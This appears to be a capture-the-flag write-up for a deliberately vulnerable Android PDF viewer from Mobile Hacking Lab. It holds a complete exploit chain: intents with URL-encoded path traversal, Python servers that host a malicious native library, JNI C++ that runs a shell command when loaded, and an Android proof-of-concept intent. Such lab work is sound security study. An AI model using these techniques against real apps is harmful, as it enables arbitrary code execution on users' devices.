---
title: Document Viewer - Mobile Hacking Lab
date: 2025-1-20 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, android]     # TAG names should always be lowercase

---



<br />

### Introduction

Welcome to the Remote Code Execution (RCE) Challenge! This lab provides a real-world scenario where you'll explore vulnerabilities in popular software. Your mission is to exploit a path traversal vulnerability combined with dynamic code loading to achieve remote code execution.

<br />

### Objective

Achieve remote code execution through a combination of path traversal and dynamic code loading vulnerabilities.

<br />

<br />



When we press the “Load PDF” button, the content of the PDF is displayed on the screen.

<br /><br />



![](/assets/img/mhl/DocumentViewer/2.png)



<br /><br />

**Analyzing the application using JADX**

From: AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>

<activity
    android:name="com.mobilehackinglab.documentviewer.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/pdf"/>
    </intent-filter>
</activity>
```

**Permissions Declared:**

1. **INTERNET** – Allows the app to make network requests.
2. **READ_EXTERNAL_STORAGE** – Allows the app to read files from external storage (Required before Android 10).
3. **WRITE_EXTERNAL_STORAGE** – Allows the app to write files to external storage (Required before Android 10).
4. **MANAGE_EXTERNAL_STORAGE** – Allows full access to external storage (Only works for **Android 11+** with special approval).

**MainActivity Configuration:**

- It is marked as **exported="true"**, meaning other apps can start this activity.

- It has an 

  intent filter

   to:

  - Launch the activity (`android.intent.action.MAIN`).
  - Show it in the app drawer (`android.intent.category.LAUNCHER`).
  - Handle **file, http, https**, and **application/pdf** file types.



<br /><br />

<br />

From: com.mobilehackinglab.documentviewer.MainActivity

```java
public final class MainActivity extends AppCompatActivity {
    private boolean proFeaturesEnabled;
    private final native void initProFeatures();

    protected void onCreate(Bundle savedInstanceState) {
        ActivityMainBinding inflate = ActivityMainBinding.inflate(getLayoutInflater());
        Intrinsics.checkNotNullExpressionValue(inflate, "inflate(...)");
        this.binding = inflate;
        if (inflate == null) {
            Intrinsics.throwUninitializedPropertyAccessException("binding");
            inflate = null;
        }
        setContentView(inflate.getRoot());
        BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, null, null, new MainActivity$onCreate$1(this, null), 3, null);
        setLoadButtonListener();
        handleIntent();
        loadProLibrary();
        if (this.proFeaturesEnabled) {
            initProFeatures();
        }
    }

    
    private final void handleIntent() {
        Intent intent = getIntent();
        String action = intent.getAction();
        Uri data = intent.getData();
        if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
            CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() { // from class: com.mobilehackinglab.documentviewer.MainActivity$handleIntent$1
                {
                    super(1);
                }

                @Override // kotlin.jvm.functions.Function1
                public /* bridge */ /* synthetic */ Unit invoke(Uri uri) {
                    invoke2(uri);
                    return Unit.INSTANCE;
                }

                /* renamed from: invoke, reason: avoid collision after fix types in other method */
                public final void invoke2(Uri uri) {
                    MainActivity mainActivity = MainActivity.this;
                    Intrinsics.checkNotNull(uri);
                    mainActivity.renderPdf(uri);
                }
            }));
        }
    }


```

`onCreate()`: This method invokes the `loadLibrary()` method, and right after that, it checks the boolean flag previously mentioned.

If the boolean is true, it will execute the `native` method `initProFeatures()` on the native library.

If the boolean is false, it will skip this part and not attempt to initialize the native library.

`initProFeatures()`: This method calls the native library and attempts to run a C++ method called `initProFeatures()`

`handleIntent()`:

- An intent is received, and some validation happens
- After the validation, the PDF is copied from the URL to the file system
- After the PDF has been copied to the file system, it is rendered in the application



<br /><br />



From: com.mobilehackinglab.documentviewer.MainActivity

```java
public final void renderPdf(Uri uri) {
    try {
        ParcelFileDescriptor parcelFileDescriptor = getContentResolver().openFileDescriptor(uri, "r");
        if (parcelFileDescriptor != null) {
            final PdfRenderer pdfRenderer = new PdfRenderer(parcelFileDescriptor);
            ActivityMainBinding activityMainBinding = this.binding;
            if (activityMainBinding == null) {
                Intrinsics.throwUninitializedPropertyAccessException("binding");
                activityMainBinding = null;
            }
            activityMainBinding.viewPager.setAdapter(new PagerAdapter() { // from class: com.mobilehackinglab.documentviewer.MainActivity$renderPdf$1$1
                @Override // androidx.viewpager.widget.PagerAdapter
                public int getCount() {
                    return pdfRenderer.getPageCount();
                }

                @Override // androidx.viewpager.widget.PagerAdapter
                public boolean isViewFromObject(View view, Object object) {
                    Intrinsics.checkNotNullParameter(view, "view");
                    Intrinsics.checkNotNullParameter(object, "object");
                    return view == object;
                }

                @Override // androidx.viewpager.widget.PagerAdapter
                public Object instantiateItem(ViewGroup container, int position) {
                    Intrinsics.checkNotNullParameter(container, "container");
                    ImageView imageView = new ImageView(container.getContext());
                    PdfRenderer.Page page = pdfRenderer.openPage(position);
                    Bitmap bitmap = Bitmap.createBitmap(page.getWidth(), page.getHeight(), Bitmap.Config.ARGB_8888);
                    Intrinsics.checkNotNullExpressionValue(bitmap, "createBitmap(...)");
                    page.render(bitmap, null, null, 1);
                    imageView.setImageBitmap(bitmap);
                    container.addView(imageView);
                    return imageView;
                }

                @Override // androidx.viewpager.widget.PagerAdapter
                public void destroyItem(ViewGroup container, int position, Object object) {
                    Intrinsics.checkNotNullParameter(container, "container");
                    Intrinsics.checkNotNullParameter(object, "object");
                    container.removeView((View) object);
                }
            });
        }
    } catch (Exception e) {
        Log.e(TAG, "Error rendering PDF: " + uri, e);
    }
}




private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(getApplicationContext().getFilesDir(), "native-libraries/" + abi);
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        Log.e(TAG, "Unable to load library with Pro version features! (You can ignore this error if you are using the Free version)", e);
        this.proFeaturesEnabled = false;
    }
}

```

`loadProLibrary()`: This method loads a native library from the file system.

The code constructs a path by doing the following:

- Determine the device architecture
- Construct the application internal library path
- Append the library name to the library path

| variable           | value                                                        |
| ------------------ | ------------------------------------------------------------ |
| abi                | `x86_64`. It returns a list of all the architectures supported by the device (e.g., armeabi-v7a, arm64-v8a, x86, x86_64). |
| libraryFolder      | `/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64` |
| libraryFile        | `/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so` |
| proFeaturesEnabled | `false`                                                      |

If the native library loads successfully, it will set a Boolean `proFeaturesEnabled` to true, otherwise if any exception is raised, this boolean will be set to false.





<br /><br />

From: com.mobilehackinglab.documentviewer.CopyUtil

```java
public final MutableLiveData<Uri> copyFileFromAssets(Context context, String fileName) {
    Intrinsics.checkNotNullParameter(context, "context");
    Intrinsics.checkNotNullParameter(fileName, "fileName");
    AssetManager assetManager = context.getAssets();
    File outFile = new File(CopyUtil.DOWNLOADS_DIRECTORY, fileName);
    MutableLiveData liveData = new MutableLiveData();
    BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromAssets$1(outFile, assetManager, fileName, liveData, null), 2, null);
    return liveData;
}

public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
    Intrinsics.checkNotNullParameter(uri, "uri");
    URL url = new URL(uri.toString());
    File file = CopyUtil.DOWNLOADS_DIRECTORY;
    String lastPathSegment = uri.getLastPathSegment();
    if (lastPathSegment == null) {
        lastPathSegment = "download.pdf";
    }
    File outFile = new File(file, lastPathSegment);
    MutableLiveData liveData = new MutableLiveData();
    BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null);
    return liveData;
}

static {
    File externalStoragePublicDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
    Intrinsics.checkNotNullExpressionValue(externalStoragePublicDirectory, "getExternalStoragePublicDirectory(...)");
    DOWNLOADS_DIRECTORY = externalStoragePublicDirectory;
}

```

- Get the remote URL from the Uri
- Get the download directory
- Use the last section of the URL as a filename
- Create a local file object
- Download the remote file to the local file system

When running the above snippet, it had the following values:

| variable        | value                                                        |
| --------------- | ------------------------------------------------------------ |
| url             | `http://ip:port/test.pdf`                                    |
| file            | `/storage/emulated/0/Download`                               |
| lastPathSegment | `test.pdf`                                                   |
| outFile         | `/storage/emulated/0/Download/test.pdf` OR `/sdcard/Download/test.pdf` |

<br />



<br />







Logcat Output:

 the native library paths and library itself doesn’t seem to exist.

```
/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so
```

<br />

![](/assets/img/mhl/DocumentViewer/1.png)







<br /><br />





**Identify the path traversal vulnerability**

by using URL encoding on the filename, you could potentially end up with a filename that contains `../` which might allow you to save the file in a different directory than the intended one.

it is possible to open the application using an intent that contains a URL to remotely load a PDF.

```
adb shell am start -n "com.mobilehackinglab.documentviewer/.MainActivity" -a "android.intent.action.VIEW" -c "android.intent.category.BROWSABLE" -d "http://ip:port/test.pdf"
```

it will be copied to /sdcard/Download/test.pdf

<br />

<br />

![](/assets/img/mhl/DocumentViewer/8.png)

<br />

<br />

<br />



```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import os


PDF_FILE_PATH = r"C:\\Users\\{user.name}\\Desktop\\test.pdf"

class PDFRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        
        if self.path == "/test.pdf":
            if os.path.exists(PDF_FILE_PATH):
                try:
                    with open(PDF_FILE_PATH, "rb") as pdf_file:
                        self.send_response(200)
                        self.send_header("Content-Type", "application/pdf")
                        self.end_headers()
                        self.wfile.write(pdf_file.read())
                except Exception as e:
                    print(f"Error: {e}")
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(b"Server error!")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found!")
        else:
            
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>PDF Server</h1><p>You can access the PDF file <a href='/test.pdf'>here</a>.</p>")

def run(server_class=HTTPServer, handler_class=PDFRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server is running: http://localhost:{port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run(port=8000)
```

<br />

Start python server

```bash
python -m http.server
```

<br />

**adb**

```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d http://192.168.1.8:8000/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Ftest.pdf
```

<br />

navigate to the /data/data/com.mobilehackinglab.documentviewer/files/ folder, you will see the PDF file.

![](/assets/img/mhl/DocumentViewer/7.png)

<br />







<br />



**To get RCE**

We need to create the libdocviewer_pro.so file and place it in the /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64 directory.

We need to write the C code that will trigger the RCE vulnerability and compile it into a .so file.

For this exploit to work, the following needs to happen:

- Create a native library with the correct native method as needed by the application
- Host this native library on our attacker web server
- Create a filename that will store the file in the application’s folder, where the native library is expected to be.
- Open our application with an intent and use the malicious filename to request the “PDF”
- Observe that the command is executed

<br />

Creating the filename:

The application expects the native library to be at:

```
/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so
```

The application originally stores the file at:

```
/storage/emulated/0/Download/
```

We need to traverse back to root and then append the new path at the end:

```
../../../../data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so
```

Finally, replace all the `/` with `%2F`:

```
..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so
```

<br />

<br />

**JNI**

write the C++ code that will trigger the RCE vulnerability and compile it into a .so file.

```c++
#include <jni.h>
#include <string>
#include <cstdlib>

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_docviewer_1pro_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {
    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());
}

extern "C" JNIEXPORT void JNICALL
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(
        JNIEnv* env,
        jobject /* this */) {

    system("touch /data/data/com.mobilehackinglab.documentviewer/files/PoC.txt");


}
```

Note: You must include a method called `initProFeatures` since this is what the Java code will execute on the native library

<br />

Then generate the apk file from android studio and decompile it with `apktool` to get the `libdocviewer_pro.so` file in the `lib/x86_64/` Directory. 

The libdocviewer_pro.so file is [here](/assets/img/mhl/DocumentViewer/libdocviewer_pro.so)

<br />

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

SO_FILE_PATH = r"C:\\Users\\{user.name}\\Desktop\\libdocviewer_pro.so"

class SORequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        
        normalized_path = os.path.normpath(self.path)
        
        if normalized_path.endswith("libdocviewer_pro.so"):
            if os.path.exists(SO_FILE_PATH):
                try:
                    with open(SO_FILE_PATH, "rb") as so_file:
                        self.send_response(200)
                        self.send_header("Content-Type", "application/octet-stream")
                        self.end_headers()
                        self.wfile.write(so_file.read())
                except Exception as e:
                    print(f"Error: {e}")
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(b"Server error!")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found!")
        else:
            
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b"Invalid request path!")

def run(server_class=HTTPServer, handler_class=SORequestHandler, port=9998):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server is running: http://localhost:{port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run(port=9998)
```

 run the Python server

```
python script-so.py
```

It retrieves the .so file from the specified file path and serves the .so file over HTTP.

<br /><br />



Or, Simply copy the new library to the device with `adb push`

Create the library folder structure and copy the library to the device

```bash
adb shell mkdir -p /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64

adb push libdocviewer_pro.so /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64
# libdocviewer_pro.so: 1 file pushed, 0 skipped. 119.3 MB/s (4912 bytes in 0.000s)

adb shell ls -la /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64
# total 28
# drwxrwxrwx 2 u0_a209 u0_a209 4096 2024-10-17 13:45 .
# drwxrwxrwx 3 u0_a209 u0_a209 4096 2024-10-15 21:21 ..
# -rw-r--r-- 1 u0_a209 u0_a209 4912 2024-10-17 13:45 libdocviewer_pro.so
```

<br />

```
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity -a android.intent.action.VIEW -d http://192.168.1.8:9998/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so
```

<br /><br />

![](/assets/img/mhl/DocumentViewer/3.png)



<br /><br />



Logcat Output

![](/assets/img/mhl/DocumentViewer/4.png)

<br />

We have placed the libdocviewer_pro.so file under the /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64 directory.

![](/assets/img/mhl/DocumentViewer/5.png)

<br /><br />

When we close and reopen the application, then click the “Load PDF” button and load any PDF file to execute the native function and get the RCE. 

![](/assets/img/mhl/DocumentViewer/6.png)



<br />

<br />

**Android app PoC**

```java
Uri uri = Uri.parse("http://ip:port/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so");
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setClassName("com.mobilehackinglab.documentviewer","com.mobilehackinglab.documentviewer.MainActivity");
intent.setData(uri);
startActivity(intent);
```

<br />

**Example for a JNI function in C++ that takes an int and returns a string**

```java
package com.example.nativecplusplus;

public class MainActivity extends AppCompatActivity {

    // Used to load the 'nativecplusplus' library on application startup.
    static {
        System.loadLibrary("nativecplusplus");
    }


    private ActivityMainBinding binding;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        // Example of a call to a native method
        TextView tv = binding.sampleText;
        tv.setText(callRetString());
    }

    /**
     * A native method that is implemented by the 'nativecplusplus' native library,
     * which is packaged with this application.
     */

    private String callRetString(){
        return callRetStringNative(42);
    }

    private String retString(int numToPrint){
        return "Printing" + numToPrint + "inside java :)";
    }
    public native String stringFromJNI();
    public native String callRetStringNative(int numToPrint);
}
```

<br /><br />



native-lib.cpp

```c++
#include <jni.h>
#include <string>

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_nativecplusplus_MainActivity_stringFromJNI(
        JNIEnv* env,
        jobject /* this */) {
    std::string hello = "Hello from C++";
    return env->NewStringUTF(hello.c_str());
}

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_nativecplusplus_MainActivity_callRetStringNative(
        JNIEnv* env,
        jobject thisObj, jint numToPrint) {

        jclass retStringClass = env->FindClass("com/example/nativecplusplus/MainActivity");
        jmethodID retStringMethodID = env ->GetMethodID(retStringClass, "retString", "(I)Ljava/lang/String;");
    return (jstring)  env->CallObjectMethod(thisObj, retStringMethodID, numToPrint);

}
```

